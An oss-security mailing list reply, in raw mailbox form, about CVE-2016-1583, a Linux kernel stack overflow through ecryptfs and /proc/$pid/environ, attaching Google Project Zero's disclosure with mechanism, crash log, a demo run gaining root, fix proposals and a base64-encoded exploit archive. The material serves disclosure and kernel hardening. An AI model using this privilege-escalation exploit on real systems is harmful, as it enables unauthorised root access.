X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["22261" "Wednesday" "22" "June" "2016" "12:28:38" "+0300" "Solar Designer" "solar@openwall.com" "<20160622092838.GA9075@openwall.com>" "414" "Re: [oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and /proc/$pid/environ" nil nil nil "6" "2016062209:28:38" "[oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and /proc/$pid/environ" (number mark "U       solar@openwa Jun 22  414/22261 " thread-indent "\"Re: [oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and /proc/$pid/environ\"\n") "<575B352F.9000808@canonical.com>" ("<575B352F.9000808@canonical.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3424 invoked by uid 550); 22 Jun 2016 09:28:55 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3403 invoked from network); 22 Jun 2016 09:28:54 -0000
Date: Wed, 22 Jun 2016 12:28:38 +0300
From: Solar Designer <solar@openwall.com>
To: oss-security@lists.openwall.com
Message-ID: <20160622092838.GA9075@openwall.com>
References: <575B352F.9000808@canonical.com>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="GvXjxJ+pjyke8COw"
Content-Disposition: inline
In-Reply-To: <575B352F.9000808@canonical.com>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] [vs-plain] Linux kernel stack overflow via ecryptfs and /proc/$pid/environ

--GvXjxJ+pjyke8COw
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Fri, Jun 10, 2016 at 02:46:23PM -0700, John Johansen wrote:
> This is a forward notification of a local priv escalation flaw from
> security@kernel.org to the OSS security list. The CRD was for
> 2016-06-08 14:00:00 UTC. Patches attached to the email.
> 
> The flaw in eCryptfs was assigned CVE-2016-1583.

The Project Zero issue is now public:

https://bugs.chromium.org/p/project-zero/issues/detail?id=836

and it includes an exploit, which I've re-attached.  (The rest of the
files, including the crasher, were already posted in here by John.)

> Subject: [PATCH 2/3] ecryptfs: forbid opening files without mmap handler

https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=2f36db71009304b3f0b95afacd8eba1f9f046b87

> Subject: [PATCH 1/3] proc: prevent stacking filesystems on top

https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=e54ad7f1ee263ffa5a2de9c609d58dfa27b21cd9

> Subject: [PATCH 3/3] sched: panic on corrupted stack end

Not committed?

Andy Lutomirski is working on virtually mapped stacks with guard pages
so that kernel stack overflows would be detected:

http://www.openwall.com/lists/kernel-hardening/2016/06/15/1
http://www.openwall.com/lists/kernel-hardening/2016/06/20/14

Linus wants the 1.5us overhead on task creation to be reduced before
this gets merged:

http://www.openwall.com/lists/kernel-hardening/2016/06/21/10

Alexander

--GvXjxJ+pjyke8COw
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="exploit-description.txt"

https://bugs.chromium.org/p/project-zero/issues/detail?id=836

Linux: Stack overflow via ecryptfs and /proc/$pid/environ
Reported by jannh@google.com, Jun 1, 2016

Stacking filesystems, including ecryptfs, protect themselves against
deep nesting, which would lead to kernel stack overflow, by tracking
the recursion depth of filesystems. E.g. in ecryptfs, this is
implemented in ecryptfs_mount() as follows:

	s->s_stack_depth = path.dentry->d_sb->s_stack_depth + 1;

	rc = -EINVAL;
	if (s->s_stack_depth > FILESYSTEM_MAX_STACK_DEPTH) {
		pr_err("eCryptfs: maximum fs stacking depth exceeded\n");
		goto out_free;
	}


The files /proc/$pid/{mem,environ,cmdline}, when read, access the
userspace memory of the target process, involving, if necessary,
normal pagefault handling. If it was possible to mmap() them, an
attacker could create a chain of e.g. /proc/$pid/environ mappings
where process 1 has /proc/2/environ mapped into its environment area,
process 2 has /proc/3/environ mapped into its environment area and so
on. A read from /proc/1/environ would invoke the pagefault handler for
process 1, which would invoke the pagefault handler for process 2 and
so on. This would, again, lead to kernel stack overflow.


One interesting fact about ecryptfs is that, because of the encryption
involved, it doesn't just forward mmap to the lower file's mmap
operation. Instead, it has its own page cache, maintained using the
normal filemap helpers, and performs its cryptographic operations when
dirty pages need to be written out or when pages need to be faulted
in. Therefore, not just its read and write handlers, but also its mmap
handler only uses the lower filesystem's read and write methods.
This means that using ecryptfs, you can mmap [decrypted views of]
files that normally wouldn't be mappable.

Combining these things, it is possible to trigger recursion with
arbitrary depth where:

a reading userspace memory access in process A (from userland or from
    copy_from_user())
causes a pagefault in an ecryptfs mapping in process A, which
causes a read from /proc/{B}/environ, which
causes a pagefault in an ecryptfs mapping in process B, which
causes a read from /proc/{C}/environ, which
causes a pagefault in an ecryptfs mapping in process C, and so on.

On systems with the /sbin/mount.ecryptfs_private helper installed
(e.g. Ubuntu if the "encrypt my home directory" checkbox is ticked
during installation), this bug can be triggered by an unprivileged
user. The mount helper considers /proc/$pid, where $pid is the PID of
a process owned by the user, to be a valid mount source because the
directory is "owned" by the user.

I have attached both a generic crash PoC and a build-specific exploit
that can be used to gain root privileges from a normal user account on
Ubuntu 16.04 with kernel package linux-image-4.4.0-22-generic, version
4.4.0-22.40, uname "Linux user-VirtualBox 4.4.0-22-generic #40-Ubuntu
SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux".

dmesg output of the crasher:

```
[   80.036069] BUG: unable to handle kernel paging request at fffffffe4b9145c0
[   80.040028] IP: [<ffffffff810c9a33>] cpuacct_charge+0x23/0x40
[   80.040028] PGD 1e0d067 PUD 0 
[   80.040028] Thread overran stack, or stack corrupted
[   80.040028] Oops: 0000 [#1] SMP 
[   80.040028] Modules linked in: vboxsf drbg ansi_cprng xts gf128mul dm_crypt snd_intel8x0 snd_ac97_codec ac97_bus snd_pcm snd_seq_midi snd_seq_midi_event snd_rawmidi vboxvideo snd_seq ttm snd_seq_device drm_kms_helper snd_timer joydev drm snd fb_sys_fops soundcore syscopyarea sysfillrect sysimgblt vboxguest input_leds i2c_piix4 8250_fintek mac_hid serio_raw parport_pc ppdev lp parport autofs4 hid_generic usbhid hid psmouse ahci libahci e1000 pata_acpi fjes video
[   80.040028] CPU: 0 PID: 2135 Comm: crasher Not tainted 4.4.0-22-generic #40-Ubuntu
[   80.040028] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006
[   80.040028] task: ffff880035443200 ti: ffff8800d933c000 task.ti: ffff8800d933c000
[   80.040028] RIP: 0010:[<ffffffff810c9a33>]  [<ffffffff810c9a33>] cpuacct_charge+0x23/0x40
[   80.040028] RSP: 0000:ffff88021fc03d70  EFLAGS: 00010046
[   80.040028] RAX: 000000000000dc68 RBX: ffff880035443260 RCX: ffffffffd933c068
[   80.040028] RDX: ffffffff81e50560 RSI: 000000000013877a RDI: ffff880035443200
[   80.040028] RBP: ffff88021fc03d70 R08: 0000000000000000 R09: 0000000000010000
[   80.040028] R10: 0000000000002d4e R11: 00000000000010ae R12: ffff8802137aa200
[   80.040028] R13: 000000000013877a R14: ffff880035443200 R15: ffff88021fc0ee68
[   80.040028] FS:  00007fbd9fadd700(0000) GS:ffff88021fc00000(0000) knlGS:0000000000000000
[   80.040028] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   80.040028] CR2: fffffffe4b9145c0 CR3: 0000000035415000 CR4: 00000000000006f0
[   80.040028] Stack:
[   80.040028]  ffff88021fc03db0 ffffffff810b4b83 0000000000016d00 ffff88021fc16d00
[   80.040028]  ffff880035443260 ffff8802137aa200 0000000000000000 ffff88021fc0ee68
[   80.040028]  ffff88021fc03e30 ffffffff810bb414 ffff88021fc03dd0 ffff880035443200
[   80.040028] Call Trace:
[   80.040028]  <IRQ> 
[   80.040028]  [<ffffffff810b4b83>] update_curr+0xe3/0x160
[   80.040028]  [<ffffffff810bb414>] task_tick_fair+0x44/0x8e0
[   80.040028]  [<ffffffff810b1267>] ? sched_clock_local+0x17/0x80
[   80.040028]  [<ffffffff810b146f>] ? sched_clock_cpu+0x7f/0xa0
[   80.040028]  [<ffffffff810ad35c>] scheduler_tick+0x5c/0xd0
[   80.040028]  [<ffffffff810fe560>] ? tick_sched_handle.isra.14+0x60/0x60
[   80.040028]  [<ffffffff810ee961>] update_process_times+0x51/0x60
[   80.040028]  [<ffffffff810fe525>] tick_sched_handle.isra.14+0x25/0x60
[   80.040028]  [<ffffffff810fe59d>] tick_sched_timer+0x3d/0x70
[   80.040028]  [<ffffffff810ef282>] __hrtimer_run_queues+0x102/0x290
[   80.040028]  [<ffffffff810efa48>] hrtimer_interrupt+0xa8/0x1a0
[   80.040028]  [<ffffffff81052fa8>] local_apic_timer_interrupt+0x38/0x60
[   80.040028]  [<ffffffff81827d9d>] smp_apic_timer_interrupt+0x3d/0x50
[   80.040028]  [<ffffffff81826062>] apic_timer_interrupt+0x82/0x90
[   80.040028]  <EOI> 
[   80.040028] Code: 0f 1f 84 00 00 00 00 00 66 66 66 66 90 48 8b 47 08 48 8b 97 78 07 00 00 55 48 63 48 10 48 8b 52 60 48 89 e5 48 8b 82 b8 00 00 00 <48> 03 04 cd 80 42 f3 81 48 01 30 48 8b 52 48 48 85 d2 75 e5 5d 
[   80.040028] RIP  [<ffffffff810c9a33>] cpuacct_charge+0x23/0x40
[   80.040028]  RSP <ffff88021fc03d70>
[   80.040028] CR2: fffffffe4b9145c0
[   80.040028] fbcon_switch: detected unhandled fb_set_par error, error code -16
[   80.040028] fbcon_switch: detected unhandled fb_set_par error, error code -16
[   80.040028] ---[ end trace 616e3de50958c35b ]---
[   80.040028] Kernel panic - not syncing: Fatal exception in interrupt
[   80.040028] Shutting down cpus with NMI
[   80.040028] Kernel Offset: disabled
[   80.040028] ---[ end Kernel panic - not syncing: Fatal exception in interrupt
```

example run of the exploit, in a VM with 4 cores, with Ubuntu 16.04 installed:

```
user@user-VirtualBox:/media/sf_vm_shared/crypt_endless_recursion/exploit$ ls
compile.sh  exploit.c  hello.c  suidhelper.c
user@user-VirtualBox:/media/sf_vm_shared/crypt_endless_recursion/exploit$ ./compile.sh 
user@user-VirtualBox:/media/sf_vm_shared/crypt_endless_recursion/exploit$ ls
compile.sh  exploit  exploit.c  hello  hello.c  suidhelper  suidhelper.c
user@user-VirtualBox:/media/sf_vm_shared/crypt_endless_recursion/exploit$ ./exploit
all spammers ready
recurser parent ready
spam over
fault chain set up, faulting now
writing stackframes
stackframes written
killing 2494
post-corruption code is alive!
children should be dead
coredump handler set. recurser exiting.
going to crash now
suid file detected, launching rootshell...
we have root privs now...
root@user-VirtualBox:/proc# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)
```

(If the exploit crashes even with the right kernel version, try
restarting the machine. Also, ensure that no program like top/htop/...
is running that might try to read process command lines. Note that
the PoC and the exploit don't really clean up after themselves and
leave mountpoints behind that prevent them from re-running without
a reboot or manual unmounting.)

Note that Ubuntu compiled their kernel with
CONFIG_SCHED_STACK_END_CHECK turned on, making it harder than it used
to be in the past to not crash the kernel while exploiting this bug,
and an overwrite of addr_limit would be useless because at the
time the thread_info is overwritten, there are multiple instances of
kernel_read() on the stack. Still, the bug is exploitable by carefully
aligning the stack so that the vital components of thread_info are
preserved, stopping with an out-of-bounds stack pointer and
overwriting the thread stack using a normal write to an adjacent
allocation of the buddy allocator.

Regarding the fix, I think the following would be reasonable:

 - Explicitly forbid stacking anything on top of procfs by setting its
   s_stack_depth to a sufficiently large value. In my opinion, there
   is too much magic going on inside procfs to allow stacking things
   on top of it, and there isn't any good reason to do it. (For
   example, ecryptfs invokes open handlers from a kernel thread
   instead of normal user process context, so the access checks inside
   VFS open handlers are probably ineffective - and procfs relies
   heavily on those.)

 - Forbid opening files with f_op->mmap==NULL through ecryptfs. If the
   lower filesystem doesn't expect to be called in pagefault-handling
   context, it probably shouldn't be called in that context.

 - Create a dedicated kernel stack cache outside of the direct mapping
   of physical memory that has a guard page (or a multi-page gap) at
   the bottom of each stack, and move the struct thread_info to a
   different place (if nothing else works, the top of the stack, above
   the pt_regs).
   While e.g. race conditions are more common than stack overflows in
   the Linux kernel, the whole vulnerability class of stack overflows
   is easy to mitigate, and the kernel is sufficiently complicated for
   unbounded recursion to emerge in unexpected places - or perhaps
   even for someone to discover a way to create a stack with a bounded
   length that is still too high. Therefore, I believe that guard
   pages are a useful mitigation.
   Nearly everywhere, stack overflows are caught using guard pages
   nowadays; this includes Linux userland, but also kernel stacks on
   Windows and OS X and, on 64-bit systems, grsecurity (using
   GRKERNSEC_KSTACKOVERFLOW).

Oh, and by the way: The `BUG_ON(task_stack_end_corrupted(prev))`
in schedule_debug() ought to be a direct panic instead of an oops. At
the moment, when you hit it, you get a recursion between the scheduler
invocation in do_exit() and the BUG_ON in the scheduler, and the
kernel recurses down the stack until it hits something sufficiently
important to cause a panic.

I'm going to send (compile-tested) patches for my first two fix
suggestions and the recursive oops bug. I haven't written a patch for
the guard pages mitigation - I'm not familiar enough with the x86
subsystem for that.

Comment 6 by jannh@google.com, Jun 16

Notes regarding the exploit:

It makes an invalid assumption that causes it to require at least around 6GB of RAM.

It has a trivially avoidable race that causes it to fail on single-core systems after overwriting the coredump handler; if this happens, it's still possible to manually trigger a coredump and execute the suid helper to get a root shell.

The page spraying is pretty primitive and racy; while it works reliably for me, there might be influencing factors that cause it to fail on other people's machines.

--GvXjxJ+pjyke8COw
Content-Type: application/x-gzip
Content-Disposition: attachment; filename="exploit.tar.gz"
Content-Transfer-Encoding: base64

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
